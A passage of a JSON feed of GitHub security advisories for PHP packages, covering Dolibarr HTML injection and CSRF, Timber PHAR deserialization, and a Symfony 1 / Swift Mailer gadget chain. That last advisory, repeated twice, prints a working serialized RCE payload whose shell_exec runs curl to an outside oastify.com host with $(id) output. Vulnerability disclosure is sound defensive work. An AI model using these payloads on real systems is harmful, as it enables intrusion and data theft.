{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Observed a HTML Injection vulnerbaility in the Home page of Dolibarr Application. This vulnerability allows an attacker to inject arbitrary HTML tags and manipulate the rendered content in the application's response. Specifically, I was able to successfully inject a new HTML tag into the returned document and, as a result, was able to comment out some part of the Dolibarr App Home page HTML code. This behavior can be exploited to perform various attacks like Cross-Site Scripting (XSS).</p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Navigate to the login page of Dolibarr application.</li>\n<li>Submit a login request with the following payload in an arbitrarily supplied body parameter: \"<strong>u70ea%22%3e%3c!--HTML_Injection_By_Sai\"=1</strong></li>\n</ol>\n<p><strong>HTTP Post Request:</strong>\nPOST /dolibarr/index.php?mainmenu=home HTTP/1.1\nHost: 192.168.37.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: <a href=\"http://192.168.37.129/dolibarr/index.php\">http://192.168.37.129/dolibarr/index.php</a>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 375\nOrigin: <a href=\"http://192.168.37.129\">http://192.168.37.129</a>\nConnection: close\nCookie: \nUpgrade-Insecure-Requests: 1</p>\n<p>token=697c1f303ef1976a713eda01d20d8eab&amp;actionlogin=login&amp;loginfunction=loginfunction&amp;backtopage=&amp;tz=5.5&amp;tz_string=Asia%2FKolkata&amp;dst_observed=0&amp;dst_first=&amp;dst_second=&amp;screenwidth=1280&amp;screenheight=587&amp;dol_hide_topmenu=&amp;dol_hide_leftmenu=&amp;dol_optimize_smallscreen=&amp;dol_no_mouse_hover=&amp;dol_use_jmobile=&amp;username=admin&amp;password=manikanta&amp;u70ea%22%3e%3c!--HTML_Injection_By_Sai=1</p>\n<ol start=\"3\">\n<li>Upon successful injection of the payload, some part of Home page HTML code was commented out.</li>\n</ol>\n<p><strong>POC</strong>\nKindly go through the below video for detailed steps:</p>\n<p><a href=\"https://user-images.githubusercontent.com/26869643/294010332-ff88d80b-cb26-4870-82d3-fb49f7ecc32f.mp4\">https://user-images.githubusercontent.com/26869643/294010332-ff88d80b-cb26-4870-82d3-fb49f7ecc32f.mp4</a></p>\n<p><strong>Remediation Suggestion</strong>\nKindly validate and sanitize all user-supplied input, especially within HTML attributes, to prevent HTML injection attacks.\nImplement proper output encoding when rendering user-provided data to ensure it is treated as plain text rather than executable HTML.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-7947-48q7-cp5m\">https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-7947-48q7-cp5m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23817\">https://nvd.nist.gov/vuln/detail/CVE-2024-23817</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7947-48q7-cp5m\">https://github.com/advisories/GHSA-7947-48q7-cp5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7947-48q7-cp5m",
            "title": "[dolibarr/dolibarr] Dolibarr Application Home Page has HTML injection vulnerability",
            "date_modified": "2024-04-18T16:42:32.000Z",
            "date_published": "2024-04-18T16:42:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7947-48q7-cp5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Timber is vulnerable to PHAR deserialization due to a lack of checking the input before passing it into the file_exists() function. If an attacker can upload files of any type to the server, he can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution especially when Timber is used with frameworks with documented POP chains like Wordpress/ vulnerable developer code.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability lies in the run function within the toJpg.php file. The two parameters passed into it are not checked or sanitized, hence an attacker could potentially inject malicious input leading to Deserialization of Untrusted Data, allowing for remote code execution:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/bcd6d031-33c6-4cc5-96b7-b72f0cf0e26c\"></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Setup the following code in /var/www/html: vuln.php represents our use of Timber functions and phar-poc.php represents code with a vulnerable POP chain.\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/967f0a16-3b7e-4b58-84cb-c1dee3291339\">\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/78bb98cf-0cd2-4635-aa01-a1eea571d0fc\">\nAs an attacker, we generate our PHAR payload using the following exploit script:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/d823e76a-fb07-468e-aed1-97b304d53ee5\">\nGenerate with:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/d3d57333-a113-468a-8b27-dc6bc1fca4e7\">\nthen change extension file from .phar to valid extension as svg,jpg,...\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/c4fdbd25-e828-4408-9feb-168f2e301d7a\">\nand execute vuln.php with php vuln.php, you should see whoami being executed:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/e341de8d-555c-4390-86a1-469b11cf0ffc\">\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/17afdb95-10ed-4c52-a93d-95eb1f60a146\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is capable of remote code execution if Timber is used with frameworks or developer code with vulnerable POP chains.</p>\n<h3 id=\"recommended-fix\">Recommended Fix</h3>\n<p>Filter the phar:// protocol.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/timber/timber/security/advisories/GHSA-6363-v5m4-fvq3\">https://github.com/timber/timber/security/advisories/GHSA-6363-v5m4-fvq3</a></li>\n<li><a href=\"https://github.com/timber/timber/commit/13c6b0f60346304f2eed4da1e0bb51566518de4a\">https://github.com/timber/timber/commit/13c6b0f60346304f2eed4da1e0bb51566518de4a</a></li>\n<li><a href=\"https://github.com/timber/timber/issues/2971\">https://github.com/timber/timber/issues/2971</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/timber/timber/CVE-2024-29800.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/timber/timber/CVE-2024-29800.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6363-v5m4-fvq3\">https://github.com/advisories/GHSA-6363-v5m4-fvq3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6363-v5m4-fvq3",
            "title": "[timber/timber] timber/timber vulnerable to Deserialization of Untrusted Data",
            "date_modified": "2024-04-18T16:32:21.000Z",
            "date_published": "2024-04-12T15:15:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6363-v5m4-fvq3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Incorrect access control in Dolibarr ERP CRM versions 19.0.0 and before, allows authenticated attackers to steal victim users' session cookies and CSRF protection tokens via user interaction with a crafted web page, leading to account takeover.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-31503\">https://nvd.nist.gov/vuln/detail/CVE-2024-31503</a></li>\n<li><a href=\"https://github.com/alexbsec/CVEs/blob/master/2024/CVE-2024-31503.md\">https://github.com/alexbsec/CVEs/blob/master/2024/CVE-2024-31503.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6ppg-rgrg-f573\">https://github.com/advisories/GHSA-6ppg-rgrg-f573</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6ppg-rgrg-f573",
            "title": "[dolibarr/dolibarr] Dolibarr vulnerable to Cross-Site Request Forgery",
            "date_modified": "2024-04-17T18:22:24.000Z",
            "date_published": "2024-04-17T00:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6ppg-rgrg-f573"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>\n<pre><code class=\"language-php\"> public function executeIndex(sfWebRequest $request)\n  {\n    $a = unserialize($request-&gt;getParameter('user'));\n  }\n</code></pre>\n<p>We will make the assumption this is the case in the rest of this explanation.</p>\n<p>Symfony 1 depends on Swift Mailer which is bundled by default in <code>vendor</code> directory in the default installation since 1.3.0. Swift Mailer classes implement some <code>__destruct()</code> methods like for instance <code>Swift_KeyCache_DiskKeyCache</code> :</p>\n<pre><code class=\"language-php\">  public function __destruct()\n  {\n    foreach ($this-&gt;_keys as $nsKey=&gt;$null)\n    {\n      $this-&gt;clearAll($nsKey);\n    }\n  }\n</code></pre>\n<p>This method is called when php destroy the object in memory. However, it is possible to include any object type in <code>$this-&gt;_keys</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>foreach($this-&gt;_keys ...)</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>\n<pre><code class=\"language-php\">  public function offsetGet($offset)\n  {\n    return sfOutputEscaper::escape($this-&gt;escapingMethod, $this-&gt;value[$offset]);\n  }\n</code></pre>\n<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>\n<pre><code class=\"language-php\">  public static function escape($escapingMethod, $value)\n  {\n    if (null === $value)\n    {\n      return $value;\n    }\n\n    // Scalars are anything other than arrays, objects and resources.\n    if (is_scalar($value))\n    {\n      return call_user_func($escapingMethod, $value);\n    }\n</code></pre>\n<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>\n<p>However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with <a href=\"https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed\">commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</a> to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.</p>\n<p>Concreetly, <code>__wakeup()</code> have been implemented to clear attributes' values:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      $this-&gt;keys = [];\n  }\n</code></pre>\n<p>And/or prevent any deserialization:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);\n  }\n</code></pre>\n<p>If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:</p>\n<pre><code class=\"language-json\">{\n  \"name\": \"friendsofsymfony1/symfony1\",\n  \"version\": \"v1.5.15\",\n  \"source\": {\n      \"type\": \"git\",\n      \"url\": \"https://github.com/FriendsOfSymfony1/symfony1.git\",\n      \"reference\": \"9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2\"\n  },\n  \"require\": {\n      \"php\": \"&gt;=5.3.0\",\n      \"swiftmailer/swiftmailer\": \"~5.2 || ^6.0\"\n  },\n  ...\n  {\n    \"name\": \"swiftmailer/swiftmailer\",\n    \"version\": \"v6.3.0\",\n  ...\n  }\n}\n</code></pre>\n<p>By reviewing releases archives, <code>composer.json</code> targets vulnerable branch 5.x before Symfony 1.5.13 included:</p>\n<pre><code class=\"language-json\">{\n    \"name\": \"friendsofsymfony1/symfony1\",\n    \"description\": \"Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance\",\n    \"type\": \"library\",\n    \"license\": \"MIT\",\n    \"require\": {\n        \"php\" : \"&gt;=5.3.0\",\n        \"swiftmailer/swiftmailer\": \"~5.2\"\n    },\n    ...\n</code></pre>\n<p>So, the gadget chain is valid for at least versions until 1.5.13.</p>\n<p>However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:</p>\n<pre><code class=\"language-shell\">[submodule \"lib/vendor/swiftmailer\"]\n    path = lib/vendor/swiftmailer\n    url = https://github.com/swiftmailer/swiftmailer.git\n    branch = 5.x\n[submodule \"lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\"]\n    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\n    url = https://github.com/FriendsOfSymfony1/doctrine1.git\n</code></pre>\n<p>And branch 5.x does not have the backport of the fix commited on branch 6.x. Last commit date from Jul 31, 2018.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>So we need the following object to trigger an OS command like <code>shell_exec(\"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\");</code>:</p>\n<pre><code class=\"language-php\">object(Swift_KeyCache_DiskKeyCache)#88 (4) {\n  [\"_stream\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  NULL\n  [\"_path\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  string(25) \"thispathshouldneverexists\"\n  [\"_keys\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  object(sfOutputEscaperArrayDecorator)#89 (3) {\n    [\"count\":\"sfOutputEscaperArrayDecorator\":private]=&gt;\n    NULL\n    [\"value\":protected]=&gt;\n    array(1) {\n      [1]=&gt;\n      string(66) \"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\"\n    }\n    [\"escapingMethod\":protected]=&gt;\n    string(10) \"shell_exec\"\n  }\n  [\"_quotes\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  bool(false)\n}\n</code></pre>\n<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>\n<ul>\n<li>gadgets.php:</li>\n</ul>\n<pre><code class=\"language-php\">class Swift_KeyCache_DiskKeyCache\n{\n  private $_path;\n  private $_keys = array();\n  public function __construct($keys, $path) {\n    $this-&gt;_keys = $keys;\n    $this-&gt;_path = $path;\n  }\n}\n\nclass sfOutputEscaperArrayDecorator\n{\n  protected $value;\n  protected $escapingMethod;\n  public function __construct($escapingMethod, $value) {\n    $this-&gt;escapingMethod = $escapingMethod;\n    $this-&gt;value = $value;\n  }\n}\n</code></pre>\n<ul>\n<li>chain.php:</li>\n</ul>\n<pre><code class=\"language-php\">namespace GadgetChain\\Symfony;\n\nclass RCE12 extends \\PHPGGC\\GadgetChain\\RCE\\FunctionCall\n{\n    public static $version = '1.3.0 &lt; 1.5.15';\n    public static $vector = '__destruct';\n    public static $author = 'darkpills';\n    public static $information = \n        'Based on Symfony 1 and Swift mailer in Symfony\\'s vendor';\n\n    public function generate(array $parameters)\n    {\n        $cacheKey = \"1\";\n        $keys = new \\sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey =&gt; $parameters['parameter']));\n        $path = \"thispathshouldneverexists\";\n        $cache = new \\Swift_KeyCache_DiskKeyCache($keys, $path);\n\n        return $cache;\n    }\n}\n</code></pre>\n<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>\n<pre><code class=\"language-http\">POST /frontend_dev.php/test/index HTTP/1.1\nHost: localhost:8001\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 532\n\nuser=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D\n</code></pre>\n<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The attacker can execute any PHP command which leads to remote code execution.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?</p>\n<p>In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<p>Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28859\">https://nvd.nist.gov/vuln/detail/CVE-2024-28859</a></li>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166\">https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r",
            "title": "[swiftmailer/swiftmailer] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency",
            "date_modified": "2024-04-17T17:07:56.000Z",
            "date_published": "2024-03-18T20:36:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>\n<pre><code class=\"language-php\"> public function executeIndex(sfWebRequest $request)\n  {\n    $a = unserialize($request-&gt;getParameter('user'));\n  }\n</code></pre>\n<p>We will make the assumption this is the case in the rest of this explanation.</p>\n<p>Symfony 1 depends on Swift Mailer which is bundled by default in <code>vendor</code> directory in the default installation since 1.3.0. Swift Mailer classes implement some <code>__destruct()</code> methods like for instance <code>Swift_KeyCache_DiskKeyCache</code> :</p>\n<pre><code class=\"language-php\">  public function __destruct()\n  {\n    foreach ($this-&gt;_keys as $nsKey=&gt;$null)\n    {\n      $this-&gt;clearAll($nsKey);\n    }\n  }\n</code></pre>\n<p>This method is called when php destroy the object in memory. However, it is possible to include any object type in <code>$this-&gt;_keys</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>foreach($this-&gt;_keys ...)</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>\n<pre><code class=\"language-php\">  public function offsetGet($offset)\n  {\n    return sfOutputEscaper::escape($this-&gt;escapingMethod, $this-&gt;value[$offset]);\n  }\n</code></pre>\n<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>\n<pre><code class=\"language-php\">  public static function escape($escapingMethod, $value)\n  {\n    if (null === $value)\n    {\n      return $value;\n    }\n\n    // Scalars are anything other than arrays, objects and resources.\n    if (is_scalar($value))\n    {\n      return call_user_func($escapingMethod, $value);\n    }\n</code></pre>\n<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>\n<p>However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with <a href=\"https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed\">commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</a> to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.</p>\n<p>Concreetly, <code>__wakeup()</code> have been implemented to clear attributes' values:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      $this-&gt;keys = [];\n  }\n</code></pre>\n<p>And/or prevent any deserialization:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);\n  }\n</code></pre>\n<p>If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:</p>\n<pre><code class=\"language-json\">{\n  \"name\": \"friendsofsymfony1/symfony1\",\n  \"version\": \"v1.5.15\",\n  \"source\": {\n      \"type\": \"git\",\n      \"url\": \"https://github.com/FriendsOfSymfony1/symfony1.git\",\n      \"reference\": \"9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2\"\n  },\n  \"require\": {\n      \"php\": \"&gt;=5.3.0\",\n      \"swiftmailer/swiftmailer\": \"~5.2 || ^6.0\"\n  },\n  ...\n  {\n    \"name\": \"swiftmailer/swiftmailer\",\n    \"version\": \"v6.3.0\",\n  ...\n  }\n}\n</code></pre>\n<p>By reviewing releases archives, <code>composer.json</code> targets vulnerable branch 5.x before Symfony 1.5.13 included:</p>\n<pre><code class=\"language-json\">{\n    \"name\": \"friendsofsymfony1/symfony1\",\n    \"description\": \"Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance\",\n    \"type\": \"library\",\n    \"license\": \"MIT\",\n    \"require\": {\n        \"php\" : \"&gt;=5.3.0\",\n        \"swiftmailer/swiftmailer\": \"~5.2\"\n    },\n    ...\n</code></pre>\n<p>So, the gadget chain is valid for at least versions until 1.5.13.</p>\n<p>However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:</p>\n<pre><code class=\"language-shell\">[submodule \"lib/vendor/swiftmailer\"]\n    path = lib/vendor/swiftmailer\n    url = https://github.com/swiftmailer/swiftmailer.git\n    branch = 5.x\n[submodule \"lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\"]\n    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\n    url = https://github.com/FriendsOfSymfony1/doctrine1.git\n</code></pre>\n<p>And branch 5.x does not have the backport of the fix commited on branch 6.x. Last commit date from Jul 31, 2018.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>So we need the following object to trigger an OS command like <code>shell_exec(\"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\");</code>:</p>\n<pre><code class=\"language-php\">object(Swift_KeyCache_DiskKeyCache)#88 (4) {\n  [\"_stream\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  NULL\n  [\"_path\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  string(25) \"thispathshouldneverexists\"\n  [\"_keys\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  object(sfOutputEscaperArrayDecorator)#89 (3) {\n    [\"count\":\"sfOutputEscaperArrayDecorator\":private]=&gt;\n    NULL\n    [\"value\":protected]=&gt;\n    array(1) {\n      [1]=&gt;\n      string(66) \"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\"\n    }\n    [\"escapingMethod\":protected]=&gt;\n    string(10) \"shell_exec\"\n  }\n  [\"_quotes\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  bool(false)\n}\n</code></pre>\n<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>\n<ul>\n<li>gadgets.php:</li>\n</ul>\n<pre><code class=\"language-php\">class Swift_KeyCache_DiskKeyCache\n{\n  private $_path;\n  private $_keys = array();\n  public function __construct($keys, $path) {\n    $this-&gt;_keys = $keys;\n    $this-&gt;_path = $path;\n  }\n}\n\nclass sfOutputEscaperArrayDecorator\n{\n  protected $value;\n  protected $escapingMethod;\n  public function __construct($escapingMethod, $value) {\n    $this-&gt;escapingMethod = $escapingMethod;\n    $this-&gt;value = $value;\n  }\n}\n</code></pre>\n<ul>\n<li>chain.php:</li>\n</ul>\n<pre><code class=\"language-php\">namespace GadgetChain\\Symfony;\n\nclass RCE12 extends \\PHPGGC\\GadgetChain\\RCE\\FunctionCall\n{\n    public static $version = '1.3.0 &lt; 1.5.15';\n    public static $vector = '__destruct';\n    public static $author = 'darkpills';\n    public static $information = \n        'Based on Symfony 1 and Swift mailer in Symfony\\'s vendor';\n\n    public function generate(array $parameters)\n    {\n        $cacheKey = \"1\";\n        $keys = new \\sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey =&gt; $parameters['parameter']));\n        $path = \"thispathshouldneverexists\";\n        $cache = new \\Swift_KeyCache_DiskKeyCache($keys, $path);\n\n        return $cache;\n    }\n}\n</code></pre>\n<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>\n<pre><code class=\"language-http\">POST /frontend_dev.php/test/index HTTP/1.1\nHost: localhost:8001\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 532\n\nuser=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D\n</code></pre>\n<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The attacker can execute any PHP command which leads to remote code execution.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?</p>\n<p>In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<p>Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28859\">https://nvd.nist.gov/vuln/detail/CVE-2024-28859</a></li>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166\">https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166</a></li>\n<li><a 